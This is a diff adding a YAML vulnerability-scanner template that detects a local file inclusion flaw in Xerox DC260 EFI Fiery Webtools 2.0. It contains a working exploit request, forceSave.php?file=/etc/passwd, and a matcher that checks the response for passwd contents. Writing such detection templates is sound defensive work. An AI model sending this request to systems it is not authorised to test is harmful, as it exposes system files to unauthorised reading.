@@ -1,0 +1,32 @@
+id: "xerox-efi-lfi"
+name: "Xerox DC260 EFI Fiery Controller Webtools 2.0 - Local File Inclusion"
+severity: "high"
+description: "Xerox DC260 EFI Fiery Controller Webtools 2.0 is vulnerable to local file inclusion because input passed thru the 'file' GET parameter in 'forceSave.php' script is not properly sanitized before being used to read files. This can be exploited by an unauthenticated attacker to read arbitrary files on the affected system."
+tech:
+  - "php"
+tags:
+  - "iot"
+  - "xerox"
+  - "disclosure"
+  - "lfi"
+  - "packetstorm"
+  - "edb"
+  - "vuln"
+cwe: "CWE-22"
+reference: "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5447.php"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/wt3/forceSave.php?file=/etc/passwd"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "regex"
+    part: "body"
+    regex:
+      - "root:.*:0:0:"
+  - type: "status"
+    status:
+      - 200
